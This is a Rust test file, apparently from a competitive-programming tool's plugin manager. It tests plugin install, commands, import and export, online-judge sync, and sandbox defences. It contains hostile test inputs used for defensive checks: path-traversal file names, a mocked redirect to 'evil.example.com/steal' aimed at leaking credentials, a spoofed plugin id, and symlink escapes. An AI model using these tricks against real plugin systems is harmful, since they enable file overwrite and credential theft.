    // Phase 4D: main repo built-in plugins are restricted to codeforces & atcoder; no built-in tools.
    let builtins: Vec<String> = mgr
        .list_plugins()
        .unwrap()
        .into_iter()
        .map(|p| p.manifest.id)
        .collect();
    assert_eq!(
        builtins,
        vec!["atcoder".to_string(), "codeforces".to_string()]
    );
    assert!(mgr.list_tools().is_empty());

    // Install a local tool plugin with ui.js and commands.
    let src = tempfile::tempdir().unwrap();
    let plugin_dir = src.path().join("demo-ui-tool");
    std::fs::create_dir_all(&plugin_dir).unwrap();
    std::fs::write(
        plugin_dir.join("manifest.toml"),
        r#"
id = "demo-ui-tool"
name = "Demo UI Tool"
version = "1.0.0"
description = "Test tool with ui.js and command"
entry = "index.js"
ui_entry = "ui.js"
capabilities = ["tool", "commands"]

[[commands]]
id = "open"
title = "Open Demo UI Tool"
context = "global"

[[tools]]
id = "echo"
name = "Echo"
"#,
    )
    .unwrap();
    std::fs::write(
        plugin_dir.join("index.js"),
        r#"
module.exports = {
  runTool(toolId, inputs) {
    return {
      summary: "ok:" + toolId,
      blocks: [{ type: "text", content: String((inputs && inputs.text) || "hi") }]
    };
  },
  runCommand(cmdId) {
    return { type: "open_tool", plugin_id: "demo-ui-tool" };
  }
};
"#,
    )
    .unwrap();
    std::fs::write(
        plugin_dir.join("ui.js"),
        "module.exports = { render(sdk) { return sdk.h(sdk.ui.Text, null, 'hello'); } };",
    )
    .unwrap();

    mgr.install_from_dir(&plugin_dir).unwrap();
    let tools = mgr.list_tools();
    assert_eq!(tools.len(), 1);
    assert_eq!(tools[0].plugin_id, "demo-ui-tool");
    assert!(tools[0].has_ui);
    assert!(!tools[0].is_builtin);

    let ui_src = mgr.read_ui_source("demo-ui-tool").unwrap().unwrap();
    assert!(ui_src.contains("render(sdk)"));

    let out = mgr
        .run_tool(
            "demo-ui-tool",
            "echo",
            serde_json::json!({ "text": "42" }),
            None,
        )
        .unwrap();
    assert_eq!(out.summary.as_deref(), Some("ok:echo"));
    assert!(matches!(out.blocks[0], ToolOutputBlock::Text { ref content, .. } if content == "42"));

    let cmd = mgr
        .run_command("demo-ui-tool", "open", serde_json::json!({}), None)
        .unwrap();
    assert_eq!(
        cmd,
        PluginCommandAction::OpenTool {
            plugin_id: "demo-ui-tool".to_string(),
            tool_id: None,
            initial_inputs: None,
        }
    );
}

#[test]
fn custom_headless_codesnap_svg_tool_with_highlight_and_png() {
    use crate::tool::ToolOutputBlock;

    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());

    let plugin_src = tempfile::tempdir().unwrap();
    std::fs::write(
        plugin_src.path().join("manifest.toml"),
        r#"
id = "codesnap-lite"
name = "CodeSnap Lite"
version = "0.1.0"
entry = "index.js"
capabilities = ["tool"]

[[tools]]
id = "snap"
name = "Render Code Card"
"#,
    )
    .unwrap();
    std::fs::write(
        plugin_src.path().join("index.js"),
        r##"
module.exports = {
  runTool(toolId, inputs) {
    const hl = host.highlight(inputs.code || "", inputs.lang || "cpp");
    const width = 320;
    const height = 40 + hl.lines.length * 20;
    const svg = '<svg xmlns="http://www.w3.org/2000/svg" width="' + width + '" height="' + height + '"><rect width="100%" height="100%" rx="8" fill="#1e293b"/></svg>';
    const pngB64 = host.render.svgToPng(svg, 1.0);
    return {
      summary: "Highlighted " + hl.lines.length + " lines (" + hl.language + ")",
      blocks: [
        { type: "svg", title: "Card SVG", svg, width, height },
        { type: "image", title: "Card PNG", png_base64: pngB64, width, height },
      ],
    };
  },
};
"##,
    )
    .unwrap();

    mgr.install_from_dir(plugin_src.path()).unwrap();
    let res = mgr
        .run_tool(
            "codesnap-lite",
            "snap",
            serde_json::json!({ "code": "int main() { return 0; }", "lang": "cpp" }),
            None,
        )
        .unwrap();
    assert_eq!(res.blocks.len(), 2);
    assert!(matches!(&res.blocks[0], ToolOutputBlock::Svg { .. }));
    match &res.blocks[1] {
        ToolOutputBlock::Image { png_base64, .. } => {
            let bytes = base64::engine::general_purpose::STANDARD
                .decode(png_base64)
                .unwrap();
            assert_eq!(&bytes[..8], b"\x89PNG\r\n\x1a\n");
        }
        other => panic!("expected Image block, got {other:?}"),
    }
}

#[test]
fn commands_context_filtering_and_execution() {
    use crate::commands::PluginCommandAction;

    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());

    let plugin_src = tempfile::tempdir().unwrap();
    std::fs::write(
        plugin_src.path().join("manifest.toml"),
        r#"
id = "cmd-demo"
name = "Cmd Demo"
version = "0.1.0"
entry = "index.js"
capabilities = ["commands"]

[[commands]]
id = "ping"
title = "Ping"
context = "global"

[[commands]]
id = "inspect-prob"
title = "Inspect Problem"
context = "problem"

[[commands]]
id = "inspect-contest"
title = "Inspect Contest"
context = "contest"
"#,
    )
    .unwrap();
    std::fs::write(
        plugin_src.path().join("index.js"),
        r#"
module.exports = {
  runCommand(cmdId, ctx) {
    if (cmdId === "ping") return { type: "message", text: "pong" };
    if (cmdId === "inspect-prob") {
      return {
        type: "tool_result",
        result: {
          blocks: [{ type: "text", content: "prob=" + (ctx && ctx.problem_id) }],
        },
      };
    }
    return { type: "none" };
  },
};
"#,
    )
    .unwrap();

    mgr.install_from_dir(plugin_src.path()).unwrap();

    let global_cmds = mgr.list_commands(Some(CommandContext::Global));
    assert!(
        global_cmds
            .iter()
            .any(|c| c.plugin_id == "cmd-demo" && c.command.id == "ping")
    );
    assert!(
        !global_cmds
            .iter()
            .any(|c| c.plugin_id == "cmd-demo" && c.command.id == "inspect-prob")
    );

    let prob_cmds = mgr.list_commands(Some(CommandContext::Problem));
    assert!(
        prob_cmds
            .iter()
            .any(|c| c.plugin_id == "cmd-demo" && c.command.id == "inspect-prob")
    );
    assert!(
        !prob_cmds
            .iter()
            .any(|c| c.plugin_id == "cmd-demo" && c.command.id == "inspect-contest")
    );

    let msg = mgr
        .run_command("cmd-demo", "ping", serde_json::json!({}), None)
        .unwrap();
    assert_eq!(
        msg,
        PluginCommandAction::Message {
            text: "pong".into()
        }
    );

    let res = mgr
        .run_command(
            "cmd-demo",
            "inspect-prob",
            serde_json::json!({ "problem_id": "a-plus-b" }),
            None,
        )
        .unwrap();
    assert!(matches!(res, PluginCommandAction::ToolResult { .. }));
}

#[test]
fn importer_and_exporter_safe_apply_and_traversal_rejection() {
    use crate::io_ext::{
        DraftSample, ExportContext, ExportFileEntry, ExportOutput, ImportDraft, ImportFileInput,
        ProblemDraft, apply_import_draft, write_export_output,
    };

    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());

    let plugin_src = tempfile::tempdir().unwrap();
    std::fs::write(
        plugin_src.path().join("manifest.toml"),
        r#"
id = "io-demo"
name = "IO Demo"
version = "0.1.0"
entry = "index.js"
capabilities = ["importer", "exporter"]

[[importers]]
id = "simple-txt"
name = "Simple Text"
extensions = [".txt"]

[[exporters]]
id = "simple-bundle"
name = "Simple Bundle"
extension = ".txt"
"#,
    )
    .unwrap();
    std::fs::write(
        plugin_src.path().join("index.js"),
        r#"
module.exports = {
  importPackage(files) {
    const first = files[0] || { text: "Demo Problem" };
    return {
      kind: "problem",
      id: "imported-a-plus-b",
      title: "Imported A+B",
      statement_md: first.text || "Compute A + B.",
      tags: ["math"],
      rating: 1200,
      time_limit: "2s",
      memory_limit: "512MB",
      samples: [{ input: "1 2\n", output: "3\n" }],
      source: { platform: "demo", id: "P100" },
      assets: { "fig.txt": "aGVsbG8=" },
    };
  },
  exportPackage(ctx) {
    return {
      summary: "Exported " + ctx.id,
      files: [
        { path: "meta.json", text: JSON.stringify({ id: ctx.id, title: ctx.title }) },
        { path: "nested/statement.md", text: ctx.statement_md || "" },
      ],
    };
  },
};
"#,
    )
    .unwrap();

    mgr.install_from_dir(plugin_src.path()).unwrap();
    assert_eq!(mgr.list_importers().len(), 1);
    assert_eq!(mgr.list_exporters().len(), 1);

    // 1. Run importer and apply to workspace
    let ws_dir = tempfile::tempdir().unwrap();
    let ws = xcpc_storage::init_workspace(ws_dir.path()).unwrap();

    let draft = mgr
        .run_importer(
            "io-demo",
            "simple-txt",
            &[ImportFileInput {
                name: "a.txt".into(),
                content_base64: String::new(),
                text: Some("Given A and B, output A+B.".into()),
            }],
        )
        .unwrap();
    let report = apply_import_draft(&ws, &draft).unwrap();
    assert_eq!(report.kind, "problem");
    assert_eq!(report.created_ids, vec!["imported-a-plus-b"]);
    assert!(report.skipped_ids.is_empty());
    assert!(
        ws.root()
            .join("problems/imported-a-plus-b/assets/fig.txt")
            .is_file()
    );
    assert_eq!(
        std::fs::read_to_string(ws.root().join("problems/imported-a-plus-b/samples/01.in"))
            .unwrap(),
        "1 2\n"
    );

    // Second import of same source deduplicates into skipped_ids
    let report2 = apply_import_draft(&ws, &draft).unwrap();
    assert!(report2.created_ids.is_empty());
    assert_eq!(report2.skipped_ids, vec!["imported-a-plus-b"]);

    // Asset path traversal must be rejected with ZipSlip
    let bad_draft = ImportDraft::Problem(ProblemDraft {
        id: Some("evil-prob".into()),
        title: "Evil".into(),
        statement_md: "x".into(),
        editorial_md: None,
        tags: None,
        rating: None,
        time_limit: None,
        memory_limit: None,
        samples: vec![DraftSample {
            input: "1\n".into(),
            output: "1\n".into(),
        }],
        source: None,
        assets: Some(BTreeMap::from([(
            "../../escape.txt".to_string(),
            "aGVsbG8=".to_string(),
        )])),
    });
    let err = apply_import_draft(&ws, &bad_draft).unwrap_err();
    assert!(matches!(err, PluginError::ZipSlip(_)), "got: {err:?}");
    assert!(!ws.root().join("problems/evil-prob").exists());

    // Read-only workspace must reject import
    let ro_ws = xcpc_storage::Workspace::open(ws_dir.path(), true).unwrap();
    let ro_err = apply_import_draft(&ro_ws, &draft).unwrap_err();
    assert!(
        matches!(ro_err, PluginError::PermissionDenied { .. }),
        "got: {ro_err:?}"
    );

    // 2. Run exporter and write output safely
    let export_out = mgr
        .run_exporter(
            "io-demo",
            "simple-bundle",
            &ExportContext {
                kind: "problem".into(),
                id: "imported-a-plus-b".into(),
                title: "Imported A+B".into(),
                metadata: serde_json::json!({ "rating": 1200 }),
                statement_md: Some("Given A and B".into()),
                editorial_md: None,
                samples: None,
                pdf_base64: None,
                problems: None,
            },
        )
        .unwrap();
    let out_dir = ws.root().join("build/export-demo");
    let written = write_export_output(&ws, &export_out, &out_dir).unwrap();
    assert_eq!(written.len(), 2);
    assert!(out_dir.join("meta.json").is_file());
    assert!(out_dir.join("nested/statement.md").is_file());

    // Export path traversal must be rejected
    let evil_export = ExportOutput {
        files: vec![ExportFileEntry {
            path: "../outside.txt".into(),
            content_base64: None,
            text: Some("pwned".into()),
        }],
        summary: None,
    };
    let exp_err = write_export_output(&ws, &evil_export, &out_dir).unwrap_err();
    assert!(
        matches!(exp_err, PluginError::ZipSlip(_)),
        "got: {exp_err:?}"
    );

    // Read-only workspace must reject exporting into workspace dir
    let ro_exp_err = write_export_output(&ro_ws, &export_out, &out_dir).unwrap_err();
    assert!(
        matches!(ro_exp_err, PluginError::PermissionDenied { .. }),
        "got: {ro_exp_err:?}"
    );
}

#[test]
fn atcoder_pagination_boundary_dedup_verify_503_and_contest_time_guard() {
    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());
    let loaded = mgr.load_plugin("atcoder").unwrap();

    // Build page 1 (500 items, epochs 1000..=1498 plus 2 items sharing boundary epoch 1499).
    let mut page1_items = Vec::with_capacity(500);
    for i in 0..498usize {
        let id = 10_000 + i;
        let epoch = 1000 + i;
        page1_items.push(format!(
            r#"{{"id":{id},"epoch_second":{epoch},"problem_id":"abc350_a","contest_id":"abc350","result":"AC","language":"C++"}}"#
        ));
    }
    page1_items.push(r#"{"id":10498,"epoch_second":1499,"problem_id":"abc350_b","contest_id":"abc350","result":"WA","language":"C++"}"#.into());
    page1_items.push(r#"{"id":10499,"epoch_second":1499,"problem_id":"abc350_b","contest_id":"abc350","result":"AC","language":"C++"}"#.into());
    let page1_body = format!("[{}]", page1_items.join(","));

    // Page 2 (from_second=1499): repeats 10498 & 10499 at epoch 1499, adds 10500 & 10501 at epoch 1499, plus 10502 at epoch 1500.
    let page2_body = r#"[
        {"id":10498,"epoch_second":1499,"problem_id":"abc350_b","contest_id":"abc350","result":"WA","language":"C++"},
        {"id":10499,"epoch_second":1499,"problem_id":"abc350_b","contest_id":"abc350","result":"AC","language":"C++"},
        {"id":10500,"epoch_second":1499,"problem_id":"abc350_c","contest_id":"abc350","result":"AC","language":"C++"},
        {"id":10501,"epoch_second":1499,"problem_id":"abc350_d","contest_id":"abc350","result":"AC","language":"C++"},
        {"id":10502,"epoch_second":1500,"problem_id":"abc350_e","contest_id":"abc350","result":"AC","language":"C++"}
    ]"#;

    let mock_http = Arc::new(MockHttpClient::new(move |req| {
        if req.url.contains("from_second=0") {
            ok_json(&page1_body)
        } else if req.url.contains("from_second=1499") {
            ok_json(page2_body)
        } else if req.url.contains("problems.json") {
            ok_json("[]")
        } else if req.url.contains("problem-models.json") {
            ok_json("{}")
        } else if req.url == "https://atcoder.jp/users/outage_user/history/json" {
            ok_json("[]")
        } else if req.url == "https://atcoder.jp/users/outage_user" {
            Ok(HttpResponse {
                status: 503,
                headers: BTreeMap::new(),
                body: "Service Unavailable".into(),
                body_base64: None,
            })
        } else if req.url == "https://atcoder.jp/contests/" {
            Ok(HttpResponse {
                status: 200,
                headers: BTreeMap::new(),
                body: r##"
                    <div id="contest-table-upcoming"><table><tbody>
                      <tr>
                        <td>TBD</td>
                        <td><a href="/contests/bad_time">Broken Time Contest</a></td>
                        <td>01:40</td>
                      </tr>
                      <tr>
                        <td>2026-12-01 21:00:00+0900</td>
                        <td><a href="/contests/abc401">AtCoder Beginner Contest 401</a></td>
                        <td>01:40</td>
                      </tr>
                    </tbody></table></div>
                "##
                .into(),
                body_base64: None,
            })
        } else {
            panic!("unexpected url: {}", req.url);
        }
    }));

    let host_ctx = HostContext {
        manifest: loaded.info.manifest.clone(),
        http_client: mock_http,
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        workspace_writer: None,
        limits: SandboxLimits::default(),
    };
    let client = OjPluginClient::new(&loaded.entry_source, &host_ctx);

    let batch = client
        .sync_submissions(
            &OjContext {
                handle: "chokudai".into(),
            },
            None,
        )
        .unwrap();
    assert_eq!(batch.submissions.len(), 503);
    assert_eq!(batch.next_cursor.as_deref(), Some("1500"));
    let unique_ids: std::collections::HashSet<&str> = batch
        .submissions
        .iter()
        .map(|s| s.submission_id.as_str())
        .collect();
    assert_eq!(unique_ids.len(), 503);
    assert!(unique_ids.contains("10500"));
    assert!(unique_ids.contains("10501"));
    assert!(unique_ids.contains("10502"));

    // Verify distinguishes 503 from 404.
    let v503 = client
        .verify(&OjContext {
            handle: "outage_user".into(),
        })
        .unwrap();
    assert!(!v503.ok);
    assert_eq!(
        v503.message.as_deref(),
        Some("AtCoder 服务暂时不可用，请稍后重试")
    );

    // fetchContests skips unparseable timeText row instead of emitting start_time: 0.
    let contests = client
        .fetch_contests(&OjContext {
            handle: String::new(),
        })
        .unwrap();
    assert_eq!(contests.len(), 1);
    assert_eq!(contests[0].contest_id, "abc401");
    assert!(contests[0].start_time > 0);
}

#[test]
fn codeforces_testing_cursor_guard_and_mid_pagination_retry() {
    use std::sync::atomic::{AtomicUsize, Ordering};

    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());
    let loaded = mgr.load_plugin("codeforces").unwrap();

    // Case 1: TESTING submission in the middle (105=OK, 104=TESTING, 103=OK) -> cursor stops at 103.
    let http1 = Arc::new(MockHttpClient::new(|_req| {
        ok_json(
            r#"{"status":"OK","result":[
                {"id":105,"creationTimeSeconds":1700000105,"verdict":"OK","problem":{"contestId":1999,"index":"A","name":"P1"}},
                {"id":104,"creationTimeSeconds":1700000104,"verdict":"TESTING","problem":{"contestId":1999,"index":"B","name":"P2"}},
                {"id":103,"creationTimeSeconds":1700000103,"verdict":"OK","problem":{"contestId":1999,"index":"C","name":"P3"}}
            ]}"#,
        )
    }));
    let ctx1 = HostContext {
        manifest: loaded.info.manifest.clone(),
        http_client: http1,
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        workspace_writer: None,
        limits: SandboxLimits::default(),
    };
    let client1 = OjPluginClient::new(&loaded.entry_source, &ctx1);
    let batch1 = client1
        .sync_submissions(
            &OjContext {
                handle: "tourist".into(),
            },
            Some("100"),
        )
        .unwrap();
    assert_eq!(batch1.submissions.len(), 3);
    assert_eq!(batch1.next_cursor.as_deref(), Some("103"));

    // Case 2: Transient failure on page 2 recovers via retry.
    let mut page1 = Vec::with_capacity(1000);
    for i in 0..1000i64 {
        let id = 2000 - i;
        page1.push(format!(
            r#"{{"id":{id},"creationTimeSeconds":1700000000,"verdict":"OK","problem":{{"contestId":1999,"index":"A","name":"P"}}}}"#
        ));
    }
    let page1_json = format!(r#"{{"status":"OK","result":[{}]}}"#, page1.join(","));
    let page2_attempts = Arc::new(AtomicUsize::new(0));
    let attempts_clone = Arc::clone(&page2_attempts);
    let http2 = Arc::new(MockHttpClient::new(move |req| {
        if req.url.contains("from=1&count=1000") {
            ok_json(&page1_json)
        } else if req.url.contains("from=1001&count=1000") {
            let n = attempts_clone.fetch_add(1, Ordering::SeqCst);
            if n == 0 {
                ok_json(r#"{"status":"FAILED","comment":"Call limit exceeded"}"#)
            } else {
                ok_json(
                    r#"{"status":"OK","result":[{"id":1000,"creationTimeSeconds":1700000000,"verdict":"OK","problem":{"contestId":1999,"index":"A","name":"P"}}]}"#,
                )
            }
        } else {
            panic!("unexpected url {}", req.url);
        }
    }));
    let ctx2 = HostContext {
        manifest: loaded.info.manifest.clone(),
        http_client: http2,
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        workspace_writer: None,
        limits: SandboxLimits::default(),
    };
    let client2 = OjPluginClient::new(&loaded.entry_source, &ctx2);
    let batch2 = client2
        .sync_submissions(
            &OjContext {
                handle: "tourist".into(),
            },
            None,
        )
        .unwrap();
    assert_eq!(batch2.submissions.len(), 1001);
    assert_eq!(batch2.next_cursor.as_deref(), Some("2000"));
    assert_eq!(page2_attempts.load(Ordering::SeqCst), 2);
}

#[test]
fn security_redirect_whitelist_kv_traversal_repo_id_and_unpremultiplied_png() {
    // 1. Redirect to non-whitelisted host must be blocked with DomainNotAllowed.
    let manifest = minimal_manifest("redir-test", &["allowed.example.com"], false);
    let mock_http = Arc::new(MockHttpClient::new(|req| {
        if req.url == "https://allowed.example.com/start" {
            Ok(HttpResponse {
                status: 302,
                headers: BTreeMap::from([(
                    "location".to_string(),
                    "https://evil.example.com/steal".to_string(),
                )]),
                body: String::new(),
                body_base64: None,
            })
        } else {
            panic!("should never follow redirect to {}", req.url);
        }
    }));
    let host_ctx = HostContext {
        manifest,
        http_client: mock_http,
        credentials: Arc::new(MemoryCredentialStore::new()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        workspace_writer: None,
        limits: SandboxLimits::default(),
    };
    let src = r#"
        module.exports = {
            go() {
                return host.http.fetch({ url: "https://allowed.example.com/start" });
            }
        };
    "#;
    let err = PluginRuntime::call_function(src, "go", &[], &host_ctx).unwrap_err();
    assert!(
        matches!(err, PluginError::DomainNotAllowed { ref host, .. } if host == "evil.example.com"),
        "expected DomainNotAllowed for evil.example.com, got: {err:?}"
    );

    // 2. Cross-host redirect between two whitelisted hosts must strip credential headers.
    let manifest2 = minimal_manifest("redir-cred", &["a.example.com", "b.example.com"], false);
    let creds = Arc::new(MemoryCredentialStore::new());
    creds.set("redir-cred", "api_key", "super-secret").unwrap();
    let mock_http2 = Arc::new(MockHttpClient::new(|req| {
        if req.url == "https://a.example.com/auth" {
            Ok(HttpResponse {
                status: 302,
                headers: BTreeMap::from([(
                    "location".to_string(),
                    "https://b.example.com/final".to_string(),
                )]),
                body: String::new(),
                body_base64: None,
            })
        } else if req.url == "https://b.example.com/final" {
            ok_json(r#"{"ok":true}"#)
        } else {
            panic!("unexpected url {}", req.url);
        }
    }));
    let host_ctx2 = HostContext {
        manifest: manifest2,
        http_client: mock_http2.clone(),
        credentials: creds,
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        workspace_writer: None,
        limits: SandboxLimits::default(),
    };
    let src2 = r#"
        module.exports = {
            go() {
                return host.http.fetch({
                    url: "https://a.example.com/auth",
                    credentialHeader: { header: "X-Api-Key", key: "api_key" }
                });
            }
        };
    "#;
    let call = PluginRuntime::call_function(src2, "go", &[], &host_ctx2).unwrap();
    assert_eq!(call.value["status"], 200);
    let reqs = mock_http2.recorded_requests();
    assert_eq!(reqs.len(), 2);
    assert_eq!(
        reqs[0].headers.get("X-Api-Key").map(String::as_str),
        Some("super-secret")
    );
    assert!(
        !reqs[1].headers.contains_key("X-Api-Key"),
        "credential header must be stripped on cross-host redirect: {:?}",
        reqs[1].headers
    );

    // 3. KvStore::open rejects traversal IDs.
    let tmp = tempfile::tempdir().unwrap();
    assert!(matches!(
        KvStore::open(tmp.path(), "../escape"),
        Err(PluginError::ManifestInvalid(_))
    ));
    assert!(matches!(
        KvStore::open(tmp.path(), "a/b"),
        Err(PluginError::ManifestInvalid(_))
    ));

    // 4. install_from_repo_entry rejects manifest.id != entry.id.
    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());
    let spoofed_zip = make_zip(&[
        (
            "manifest.toml",
            br#"
id = "codeforces"
name = "Spoofed"
version = "9.9.9"
entry = "index.js"
capabilities = ["oj_source"]
"#,
        ),
        ("index.js", b"module.exports = {};"),
    ]);
    let entry = RepoPluginEntry {
        id: "benign-tool".into(),
        name: "Benign Tool".into(),
        version: "0.1.0".into(),
        description: "Claims to be benign-tool".into(),
        download_url: "https://repo.example.com/spoof.zip".into(),
        sha256: sha256_hex(&spoofed_zip),
        capabilities: vec![],
        has_ui: false,
        official: false,
        permissions: None,
    };
    let zip_clone = spoofed_zip.clone();
    let repo_http =
        MockHttpClient::new(|_| ok_json("{}")).with_bytes_handler(move |_| Ok(zip_clone.clone()));
    let id_err = mgr.install_from_repo_entry(&entry, &repo_http).unwrap_err();
    assert!(
        matches!(id_err, PluginError::InvalidPackage(_)),
        "expected InvalidPackage on ID mismatch, got: {id_err:?}"
    );
    assert!(
        !mgr.plugins_dir().join("codeforces").exists(),
        "mismatched repo plugin must not be installed"
    );

    // 5. svg_to_png_base64 produces unpremultiplied RGBA (50% opaque white has RGB ~= 255, not ~128).
    let svg = r##"<svg xmlns="http://www.w3.org/2000/svg" width="4" height="4"><rect width="4" height="4" fill="#ffffff" fill-opacity="0.5"/></svg>"##;
    let b64 = crate::render::svg_to_png_base64(svg, Some(1.0)).unwrap();
    let png_bytes = base64::engine::general_purpose::STANDARD
        .decode(&b64)
        .unwrap();
    let decoder = png::Decoder::new(std::io::Cursor::new(&png_bytes));
    let mut reader = decoder.read_info().unwrap();
    let mut buf = vec![0u8; reader.output_buffer_size().unwrap()];
    let info = reader.next_frame(&mut buf).unwrap();
    let pixel = &buf[..info.buffer_size()];
    // First pixel: R, G, B should be close to 255 (straight alpha), A should be ~128.
    assert!(
        pixel[0] >= 250 && pixel[1] >= 250 && pixel[2] >= 250,
        "expected unpremultiplied white RGB >= 250, got {:?}",
        &pixel[..4]
    );
    assert!(
        (120..=136).contains(&pixel[3]),
        "expected alpha ~128, got {}",
        pixel[3]
    );
}

#[cfg(unix)]
#[test]
fn load_plugin_rejects_symlink_escape() {
    use std::os::unix::fs::symlink;

    let data_dir = tempfile::tempdir().unwrap();
    let outside_dir = tempfile::tempdir().unwrap();
    let secret_file = outside_dir.path().join("secret.js");
    std::fs::write(&secret_file, "module.exports = { secret: true };").unwrap();

    let plugin_dir = data_dir.path().join("plugins/sym-evil");
    std::fs::create_dir_all(&plugin_dir).unwrap();
    std::fs::write(
        plugin_dir.join("manifest.toml"),
        r#"
id = "sym-evil"
name = "Symlink Evil"
version = "0.1.0"
entry = "index.js"
capabilities = ["tool"]
"#,
    )
    .unwrap();
    symlink(&secret_file, plugin_dir.join("index.js")).unwrap();

    let mgr = PluginManager::new(data_dir.path());
    let err = mgr.load_plugin("sym-evil").unwrap_err();
    assert!(
        matches!(err, PluginError::SymlinkEscape(_)),
        "expected SymlinkEscape for symlink escape in load_plugin, got: {err:?}"
    );
}

#[cfg(unix)]
#[test]
fn link_plugin_security_unregistered_and_inner_escape_rejected() {
    use std::os::unix::fs::symlink;

    let data_dir = tempfile::tempdir().unwrap();
    let dev_root = tempfile::tempdir().unwrap();
    let outside = tempfile::tempdir().unwrap();
    let dev_dir = dev_root.path().join("my-dev-tool");
    std::fs::create_dir_all(&dev_dir).unwrap();
    std::fs::write(
        dev_dir.join("manifest.toml"),
        r#"
id = "my-dev-tool"
name = "My Dev Tool"
version = "0.1.0"
entry = "index.js"
capabilities = ["tool"]
"#,
    )
    .unwrap();
    std::fs::write(
        dev_dir.join("index.js"),
        "module.exports = { runTool() { return { blocks: [{ type: 'text', content: 'ok' }] }; } };",
    )
    .unwrap();

    let mgr = PluginManager::new(data_dir.path());

    // 1. Registered link succeeds and shows is_linked = true.
    let linked = mgr.link_plugin_dir(&dev_dir).unwrap();
    assert!(linked.is_linked);
    assert!(linked.link_target.is_some());
    assert!(mgr.load_plugin("my-dev-tool").is_ok());

    // 2. Unregistered symlink in plugins/ is strictly rejected.
    let rogue_dir = outside.path().join("rogue");
    std::fs::create_dir_all(&rogue_dir).unwrap();
    std::fs::write(
        rogue_dir.join("manifest.toml"),
        "id = \"rogue\"\nname = \"Rogue\"\nversion = \"0.1.0\"\nentry = \"index.js\"\n",
    )
    .unwrap();
    std::fs::write(rogue_dir.join("index.js"), "module.exports = {};").unwrap();
    symlink(&rogue_dir, mgr.plugins_dir().join("rogue")).unwrap();
    let rogue_err = mgr.load_plugin("rogue").unwrap_err();
    assert!(
        matches!(rogue_err, PluginError::SymlinkEscape(_)),
        "expected SymlinkEscape for unregistered symlink, got: {rogue_err:?}"
    );
    // `list_plugins` must also omit unregistered symlinks.
    assert!(
        !mgr.list_plugins()
            .unwrap()
            .iter()
            .any(|p| p.manifest.id == "rogue")
    );

    // 3. Inner symlink escape inside a registered linked plugin is still rejected.
    let secret = outside.path().join("secret.js");
    std::fs::write(&secret, "module.exports = {};").unwrap();
    std::fs::remove_file(dev_dir.join("index.js")).unwrap();
    symlink(&secret, dev_dir.join("index.js")).unwrap();
    let escape_err = mgr.load_plugin("my-dev-tool").unwrap_err();
    assert!(
        matches!(escape_err, PluginError::SymlinkEscape(_)),
        "expected SymlinkEscape for inner symlink escape, got: {escape_err:?}"
    );

    // 4. Unlink removes symlink and registration without deleting dev_dir.
    assert!(mgr.unlink_plugin("my-dev-tool").unwrap());
    assert!(dev_dir.exists());
    assert!(!mgr.plugins_dir().join("my-dev-tool").exists());
    assert!(mgr.list_links().unwrap().is_empty());
}

#[test]
fn quickjs_error_stack_contains_real_plugin_filename() {
    let manifest = PluginManifest::from_toml_str(
        r#"
id = "stack-demo"
name = "Stack Demo"
version = "0.1.0"
entry = "index.js"
capabilities = ["tool"]
"#,
    )
    .unwrap();
    let source = "function boom() {\n  throw new Error('kaboom');\n}\nmodule.exports = { runTool() { boom(); } };";
    let host_ctx = HostContext {
        manifest,
        http_client: Arc::new(MockHttpClient::new(|_| unreachable!())),
        credentials: Arc::new(MemoryCredentialStore::default()),
        kv: Arc::new(KvStore::in_memory()),
        workspace: None,
        workspace_writer: None,
        limits: SandboxLimits::default(),
    };
    let err = PluginRuntime::call_function(source, "runTool", &[], &host_ctx).unwrap_err();
    let msg = err.to_string();
    assert!(
        msg.contains("xcpc-plugin://stack-demo/index.js"),
        "expected stack trace to reference real plugin filename, got: {msg}"
    );
}

#[test]
fn default_official_repo_respects_removal() {
    let data_dir = tempfile::tempdir().unwrap();
    let mgr = PluginManager::new(data_dir.path());
    let initial = mgr.list_repos().unwrap();
    assert_eq!(initial.len(), 1);
    let url = initial[0].url.clone();
    assert!(mgr.remove_repo(&url).unwrap());
    // Once removed, `plugin_repos.json` exists with empty list and does not re-add official repo.
    assert!(mgr.list_repos().unwrap().is_empty());
}

#[test]
fn check_and_pack_plugin_dir_and_vite_scaffold() {
    let tmp = tempfile::tempdir().unwrap();
    let plugin_dir = tmp.path().join("my-sample-tool");
    init_plugin_scaffold(&plugin_dir, ScaffoldKind::Tool).unwrap();
    // Add dev artifacts that must NOT be packed into the zip.
    std::fs::create_dir_all(plugin_dir.join("node_modules/foo")).unwrap();
    std::fs::write(plugin_dir.join("node_modules/foo/bar.js"), "ignored").unwrap();
    std::fs::create_dir_all(plugin_dir.join("src")).unwrap();
    std::fs::write(plugin_dir.join("src/index.ts"), "ignored").unwrap();

    let report = crate::check_plugin_dir(&plugin_dir);
    assert!(report.ok, "unexpected check issues: {:?}", report.issues);
    assert!(report.exports.iter().any(|e| e == "runTool"));

    let out_zip = tmp.path().join("dist.zip");
    let packed = crate::pack_plugin_dir(&plugin_dir, Some(&out_zip)).unwrap();
    assert_eq!(packed.plugin_id, "my-sample-tool");
    assert_eq!(packed.sha256.len(), 64);
    assert!(packed.files.contains(&"manifest.toml".to_string()));
    assert!(packed.files.contains(&"index.js".to_string()));
    assert!(packed.files.contains(&"ui.html".to_string()));
    assert!(
        !packed
            .files
            .iter()
            .any(|f| f.starts_with("node_modules") || f.starts_with("src/"))
    );

    // Missing required export must fail check & pack.
    std::fs::write(plugin_dir.join("index.js"), "module.exports = {};").unwrap();
    let bad_report = crate::check_plugin_dir(&plugin_dir);
    assert!(!bad_report.ok);
    assert!(bad_report.issues.iter().any(|i| i.code == "MISSING_EXPORT"));
